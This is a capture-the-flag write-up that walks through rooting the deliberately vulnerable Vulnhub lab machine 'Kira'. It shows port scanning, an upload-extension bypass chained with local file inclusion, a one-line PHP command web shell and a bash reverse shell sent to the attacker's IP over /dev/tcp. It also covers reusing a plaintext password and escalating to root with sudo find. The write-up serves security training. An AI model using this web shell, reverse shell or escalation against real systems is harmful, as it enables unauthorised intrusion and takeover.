---
title: Kira (Vulnhub Writeup)
date: 2023-05-20
categories: [Writeups, Vulnhub]
tags: [Linux, RCE, Easy, SUID Privilege escalation]
---

![](/assets/img/kira/1.jpg)

Hello everyone! How are you doing? Today, we're going to be solving another `Vulnhub` machine. Almost every machine of this platform is **very** easy, so this one is not an exception, but that doesn't mean that this machine is boring. 

## Enumeration

- - -

Before we start enumerating the opened ports, we need to know the IP of the victim machine. We are going to perform this with `arp-scan`:

```zsh
❯ arp-scan -I wlan0 --ignoredups --localnet
Interface: wlan0, type: EN10MB, MAC: 3c:a0:67:42:9b:ce, IPv4: 192.168.0.106
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	ac:84:c6:d2:37:b2	TP-LINK TECHNOLOGIES CO.,LTD.
192.168.0.10	f4:4d:30:92:f9:65	Elitegroup Computer Systems Co.,Ltd.
192.168.0.111	08:00:27:ab:1c:fb	PCS Systemtechnik GmbH
192.168.0.101	7c:2f:80:ed:0c:de	Gigaset Communications GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.063 seconds (124.09 hosts/sec). 4 responded
```

Ok, so the victim's IP address is `192.168.0.111`. Now that we know that, we can start enumerating with `nmap`:

```zsh
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.0.111 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 12:56 CEST
Initiating ARP Ping Scan at 12:56
Scanning 192.168.0.111 [1 port]
Completed ARP Ping Scan at 12:56, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:56
Scanning 192.168.0.111 [65535 ports]
Discovered open port 80/tcp on 192.168.0.111
Completed SYN Stealth Scan at 12:56, 1.09s elapsed (65535 total ports)
Nmap scan report for 192.168.0.111
Host is up, received arp-response (0.00012s latency).
Scanned at 2023-05-20 12:56:04 CEST for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:AB:1C:FB (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.36 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Now, let's extract the info with our `extractPorts` function:

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	batcat extractPorts.tmp
	rm extractPorts.tmp
}
```

Extract the info...

```zsh
❯ extractPorts allPorts

    [*] Extracting information...

        [*] IP Address: 192.168.0.111
        [*] Open ports: 80

    [*] Ports copied to clipboard
```

After that, let's perform a deeper scan to that port:

```zsh
❯ nmap -sCV -p80 192.168.0.111 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 12:58 CEST
Nmap scan report for 192.168.0.111
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:AB:1C:FB (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
```

## Foothold

- - -

In the previous nmap scan, we saw that the port `80` was opened, so that means that a web service is running. Let's access it!

![](/assets/img/kira/2.png)

If we click on both, we can start seeing a very dangerous vector to attack:

- The `upload` button will redirect us to a `/upload.php` file, in which we will upload an image that contains php code that will be interpreted on the server
- The `language` field is vulnerable to `LFI` without doing anything

## Shell - www-data

- - -

First, let's try the `LFI`:

![](/assets/img/kira/3.png)

Ok, very easy. So, using the `LFI`, we can call the malicious `.php` that we will creat. Now, if you try to upload any other file that doesn't have an extension such as `png`, `jpg` or `jpeg`, the server will say that you can't upload the file:

![](/assets/img/kira/4.png)

Now, this is pretty easy to evade. We just need to intercept the request with `burpsuite` and change the extension from `php` to `php1.png`. Then, we will execute the file using the `LFI`. 
Now, create a `cmd.php`file:

```php
<?php
    system($_REQUEST['cmd']);
?>
```

Now, upload the file and intercept the request with `burpsuite`:

![](/assets/img/kira/5.png)

After that, change the extension to `.php1.png` and hit `send`:

![](/assets/img/kira/6.png)

Now, in the right side, you should see that the image was successfully uploaded:

![](/assets/img/kira/7.png)

Now, using the `LFI` vulnerability, we can execute the `cmd.php1.png` file, and it should give us `RCE`:

![](/assets/img/kira/8.png)

NICEE!! We have `RCE`! Now, let's start our `netcat` listener and after that, send us a `reverse shell`:

```zsh
❯ nc -lvnp 443
listening on [any] 443 ...
```

![](/assets/img/kira/9.png)

After the `cmd` parameter we need to enter `bash -c "bash -i >%26 /dev/tcp/192.168.0.106/443 0>%261"`
> **Note:** the `%26` is an `&`, but is `urlencoded`

Now, let's check our `netcat` listener:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.111] 44576
bash: cannot set terminal process group (693): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bassam-aziz:/var/www/html$ 
```

Perfect!! We have a shell as `www-data` on the victim machine! 

## Shell - bassam

- - -

First, we need to enumerate a little bit the files on the machine:

```bash
www-data@bassam-aziz:/var/www/html$ ls -la
total 28
drwxr-xr-x 4 root root 4096 ما 26  2020 .
drwxr-xr-x 3 root root 4096 ما 26  2020 ..
-rw-r--r-- 1 root root  163 ما 26  2020 index.html
-rw-r--r-- 1 root root  287 ما 26  2020 language.php
drwxr-xr-x 2 root root 4096 نو  4  2020 supersecret-for-aziz
-rw-r--r-- 1 root root  747 ما 26  2020 upload.php
drwxrwxrwx 2 root root 4096 ما 20 13:30 uploads
www-data@bassam-aziz:/var/www/html$ 
```

Here we can see a very wierd directory: `supersecret-for-aziz`. Let's access it and list it's content:

```bash
www-data@bassam-aziz:/var/www/html$ cd supersecret-for-aziz
www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ ls -la
total 12
drwxr-xr-x 2 root root 4096 نو  4  2020 .
drwxr-xr-x 4 root root 4096 ما 26  2020 ..
-rw-r--r-- 1 root root   15 نو  4  2020 bassam-pass.txt
www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ cat bassam-pass.txt
Password123!@#
www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ 
```

Ok, that's easy XD. Now we have a password for the user `bassam`. 
> **Note:** you can find the username by running `ls /home`

Let's change to the user `bassam`:

```bash
www-data@bassam-aziz:/var/www/html/supersecret-for-aziz$ su bassam
Password: 
bassam@bassam-aziz:/var/www/html/supersecret-for-aziz$ cd 
bassam@bassam-aziz:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  user.txt  Videos
bassam@bassam-aziz:~$ cat user.txt
THM{Bassam-Is-Better_Than-KIRA}
bassam@bassam-aziz:~$ 
```

Perfect!! We are now user `bassam`. 
This is only a curiosity, the flag seems from `THM`. I didn't know that there was machines of that platform on `Vulnhub`.

## Privilege escalation

- - -

This step is the **easyest** one. 

First run `sudo -l` to see what commands we can run as root:

```bash
bassam@bassam-aziz:~$ sudo -l
[sudo] password for bassam: 
Matching Defaults entries for bassam on bassam-aziz:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bassam may run the following commands on bassam-aziz:
    (ALL : ALL) /usr/bin/find
bassam@bassam-aziz:~$ 
```

Ok, so we can run as `ALL` users the command `find`. The only thing we need to do is to search `find` in [GTFOBINS](https://gtfobins.github.io/gtfobins/find/).
This will give us the way to privilege escalate:

```bash
bassam@bassam-aziz:~$ sudo find . -exec /bin/bash -p \; -quit
root@bassam-aziz:~# 
```

Great!! Rooted machine. 

## Conclusions

- - -

For me this machine was, meh. The intrusion is not very original, the user neither, and the privilege escalation was **very** easy. 
This machine is very nice if you are starting, you can learn about some `php` or `GTFOBINS`.

As always, it's me, Ruycr4ft, take care!!